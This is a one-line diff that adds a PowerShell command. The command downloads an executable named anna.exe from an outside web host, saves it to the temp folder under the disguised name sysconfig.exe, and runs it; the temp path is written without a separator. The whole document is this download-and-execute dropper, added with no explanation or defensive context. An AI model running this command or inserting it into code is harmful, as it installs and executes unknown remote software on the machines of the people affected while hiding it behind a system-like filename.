@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://www.macwizinfo.com/updates/anna.exe',"$env:TEMPsysconfig.exe");Start-Process ("$env:TEMPsysconfig.exe")
